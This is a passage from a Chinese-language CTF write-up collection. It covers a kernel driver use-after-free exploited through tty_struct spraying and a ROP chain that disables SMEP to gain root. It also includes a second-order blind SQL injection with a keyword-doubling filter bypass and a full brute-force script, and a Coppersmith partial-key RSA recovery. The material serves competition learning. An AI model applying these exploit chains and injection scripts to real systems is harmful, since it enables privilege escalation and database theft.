    print shortest_vector
    x = ""
    for v in shortest_vector[1:]:
        if v == 1:
            x += "1"
        elif v == -1:
            x += "0"
    print x
    print hex(int(x,2))[2:-1].decode("hex")
    #flag{M3k13_he11M4N_1ik3s_1Att1ce}
**9.BabyDriver 类型：pwn 分值：450分**
**0x00 前言**
首先题目给了一套系统环境，利用qemu启动，nc连接比赛环境后会得到一个低权限的shell，同时题目给了一个babyDriver.ko，通过insmod将驱动加载进系统，先进行环境搭建，我们使用的是qemu，根据题目给的boot.sh可以得到qemu的启动命令。
    qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
这里需要提的一点是很多人都是虚拟机里的Linux安装的qemu，这里有可能会报一个KVM的错误，这里需要开启虚拟机/宿主机的虚拟化功能。
启动后我们可以进入当前系统，如果要调试的话，我们需要在qemu启动脚本里加一条参数-gdb tcp::1234
-S，这样系统启动时会挂起等待gdb连接，进入gdb，通过命令
    Target remote localhost:1234
    Continue
就可以远程调试babyDriver.ko了。
**0x01 漏洞分析**
通过IDA打开babyDriver.ko，这个驱动非常简单，实现的都是一些基本功能
关于驱动通信网上有很多介绍，这里我不多介绍了，这个驱动存在一个伪条件竞争引发的UAF漏洞，也就是说，我们利用open(/dev/babydev,O_RDWR)打开两个设备A和B，随后通过ioctl会释放掉babyopen函数执行时初始化的空间，而ioctl可以控制申请空间的大小。
    __int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, __int64 a4)
    {
      _fentry__(filp, command, arg, a4);
      v5 = v4;
      if ( (_DWORD)command == 65537 )//COMMAND需要为0x10001
      {
        kfree(babydev_struct.device_buf);//释放初始化空间
        LODWORD(v6) = _kmalloc(v5, 37748928LL);//申请用户可控空间
        babydev_struct.device_buf = v6;
        babydev_struct.device_buf_len = v5;
        printk("alloc donen", 37748928LL);
        result = 0LL;
      }
      else
      {
        printk(&unk_2EB, v4);
        result = -22LL;
      }
      return result;
    }
所以这里我们申请的buffer可控，再仔细看write和read函数，都做了严格的判断控制，似乎漏洞不在这里。
      if ( babydev_struct.device_buf )//判断buf必须有值
      {
        result = -2LL;
        if ( babydev_struct.device_buf_len > v4 )//判断malloc的空间大小必须大于用户读写空间大小
正如之前所说，这个漏洞是一个伪条件竞争引发的UAF，也就是说，我们通过open申请两个设备对象A和B，这时候释放设备对象A，通过close关闭，会发现设备对象B在使用设备对象A的buffer空间。这是因为A和B在使用同一个全局变量。
因此，释放设备A后，当前全局变量指向的空间成为释放状态，但通过设备对象B可以调用write/read函数读写该空间的内容。
我们就能构造一个简单的poc，通过open申请设备对象A和B，ioctl对A和B初始化一样大小的空间，通过kmalloc申请的空间初始化后都为0，随后我们通过close的方法关闭设备对象A，这时候再通过write，向设备对象B的buffer写入。
首先会将buffer的值交给rdi，并且做一次检查。
    .text:00000000000000F5 ; 7:   if ( babydev_struct.device_buf )
    .text:00000000000000F5                 mov     filp, cs:babydev_struct.device_buf
    .text:00000000000000FC                 test    rdi, rdi
    .text:00000000000000FF                 jz      short loc_125
rdi寄存器存放的就是buffer指针。
可以看到，指针指向的空间的值已经不是初始化时候复盖的全0了。
当前目标缓冲区内已经由于释放导致很多内容不为0，这时候，我们同样可以通过read的方法读到其他地址，获取地址泄露的能力。
在test之后泄露出来了一些额外的值，因此可以通过read的方法来进行info leak。
**0x02 Exploit**
既然这片空间是释放的状态，那么我们就可以在这个空间覆盖对象，同时，我们可以通过对设备B的write/read操作，达到对这个内核对象的读写能力，ling提到了tty_struct结构体，这是Linux驱动通信一个非常重要的数据结构，关于tty_struct结构体的内容可以去网上搜到。
于是整个问题就比较明朗了，我们可以通过这个漏洞来制造一个hole，这个hole的大小可以通过ioctl控制，我们将其控制成tty_struct结构体的大小0x2e0，随后close关闭设备A，通过open(/dev/ptmx)的方法申请大量的tty_struct结构体，确保这个结构体能够占用到这个hole，之后通过对设备B调用write/read函数完成对tty_struct结构体的控制。
首先我们按照上面思路，编写一个简单的poc。
        fd = open("/dev/babydev",O_RDWR);
        fd1 = open("/dev/babydev",O_RDWR);
        //init babydev_struct
        printf("Init buffer for tty_struct,%dn",sizeof(tty));
        ioctl(fd,COMMAND,0x2e0);
        ioctl(fd1,COMMAND,0x2e0);
当close(fd)之后，我们利用open的方法覆盖tty_struct，同时向tty_struct开头成员变量写入test数据，退出时会由于tty_struct开头成员变量magic的值被修改导致异常。
接下来，我们只需要利用0CTF中一道很有意思的内核题目KNOTE的思路，在tty_struct的tty_operations中构造一个fake
oprations，关键是修改其中的ioctl指针，最后达成提权效果。
首先，我们需要利用设备B的read函数来获得占位tty_struct的头部结构，然后才是tty_operations。
当然，通过启动命令我们可以看到，系统开启了smep，我们需要构造一个rop
chain来完成对cr4寄存器的修改，将cr4中smep的比特位置0，来关闭smep。
        unsigned long rop_chain[] = {
            poprdiret,
            0x6f0, // cr4 with smep disabled
            native_write_cr4,
            get_root_payload,
            swapgs,
            0, // dummy
            iretq,
            get_shell,
            user_cs, user_rflags, base + 0x10000, user_ss};
解决了SMEP，我们就能完成最后的提权了。至此，我们可以将整个利用过程按照如下方式完成，首先利用设备A和B，close设备A，释放buffer，同时设备B占用同一个buffer空间，用tty_struct对象占位，然后设备B的write/read函数可以完成对tty_struct的读写。
至此，我们要构造fake struct来控制rip。
我们通过覆盖tty_struct中的tty_operations，来将fake tty_operations的ioctl函数替换掉，改成stack
pivot，之后我们调用ioctl函数的时候相当于去执行stack pivot，从而控制rip。
当然，这个ioctl的设备对象不能是设备B，而是需要tty_struct喷射时所使用的的设备对象，tty_struct的喷射使用open方法完成。
    for(i=0;iioctl被修改，转而去执行stack pivot，从而获得控制rip的能力，这样通过stack
pivot，就可以进入我们rop chain了。
之后我们通过get root payload来完成提权。
    root_payload(void)
    {
        commit_creds(prepare_kernel_cred(0));
    }
由于这道题目的环境没有KASLR，所以内核地址都没有变化，可以直接写死，当然，如果内核地址有变化也没有关系，通过设备B的read方法可以读到内核地址，算出基址，再加上偏移，一样可以得到commit_cred和prepare_kernel_cred的地址。
最后通过get shell完成提权，获得root权限。
**10.flag bending machine 类型：WEB 分值：300分**
进去是一个注册及登陆，经过一番fuzz，认为最有可能是二次注入 例如我注册一个bendawang' or 1=1#和注册一个bendawang' or
1=0#，猜想在查询余额时的语句为
    select xxx from xxx where username=bendawang' or 1=1#
    select xxx from xxx where username=bendawang' or 1=0#
所以很容易知道，如果是第一种情况，后面的or
1=1恒真，也就是查询的结果是整个表的结果，而第二个则是用户名为bendawang的结果，也就是说，猜想查询多个结果时取第一个的话，如果我购买了东西，也就是第一种情况显示的余额是不变的，而第二种情况是会变的。就可以根据这个点来进行二分盲注。
另外需要注意的是，题目过滤了一些关键字，select ,from
,on等，不过可以双写绕过，其中on是最坑的，这是最开始测试union是否被过滤发现的。都可以通过双写就能绕过了。 其它也就没有什么过滤了。
最后爆破出来的表名fff1ag，列名thisi5f14g 爆破flag的脚本如下：
    import requests
    import string
    import random
    import time
    import re
    #fff1ag
    #thisi5f14g
    url='http://106.75.107.53:8888/'
    chars=string.printable[:62]+"!@#$%^&*()_+-={}"
    header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Connection': 'keep-alive'
            }
    def register(data):
        result = requests.post(url+"register.php",data=data,headers=header)
        if "Register success" in result.content:
            return True
        else:
            return False
    def check(data):
        data=data.replace('on','')
        #print data
        r=requests.session()
        content=r.post(url+"login.php",data=data,headers=header).content
        #print content
        if "wrong" in content:
            raw_input("error!!!!!!!!!!!!!!!!!!!!!!");
        balance=int(re.findall('you balance is (.*?)',content)[0])
        #print "balance1:"+str(balance)
        r.get(url+'buy.php?id=1')
        content=r.get(url+'user.php').content
        balance2=int(re.findall('you balance is (.*?)',content)[0])
        #print "balance2:"+str(balance2)
        if balance-2333==balance2:
            return True
        else:
            return False
    ans=""
    for i in xrange(1,100):
        for j in chars:
            username=str(time.time())+"' or ord(substr((selonect thisi5f14g froonm fff1ag),%d,1))=%s#"%(i,ord(j))
            #print username
            password='123'
            data='user='+username+'&pass='+password
            if register(data)==True:
                print i,j
                if check(data)==True:
                    ans+=j
                    print ans
                    break
截图如下：
**11.partial 类型：Crypto 分值：300分**
Coppersmith Attack 已知部分p，其实给的有点多，给576bit的就足够了
    n=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9
    p=0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000
    p_fake = p+0x10000000000000000000000000
    pbits = 1024
    kbits = pbits-576
    pbar = p_fake & (2^pbits-2^kbits)
    print "upper %d bits (of %d bits) is given" % (pbits-kbits, pbits)
    PR. = PolynomialRing(Zmod(n))
    f = x + pbar
    x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root = n^0.4
    print x0 + pbar
    flag{4_5ing1e_R00T_cAn_chang3_eVeryth1ng}
**12.badhacker 类型：MISC 分值：200分**
首先看到pcap中IRC交流
意思就是在这个服务器上找文件，然后找改动的地方，把行号排序计算md5
This server 就是irc服务器
扫描端口
发现
http://202.5.20.47:8923
这个服务是开的
这里有个脑洞，服务器不支持host为ip的请求，只能讲host改为其他的，如提示的misc.ichunqiu.com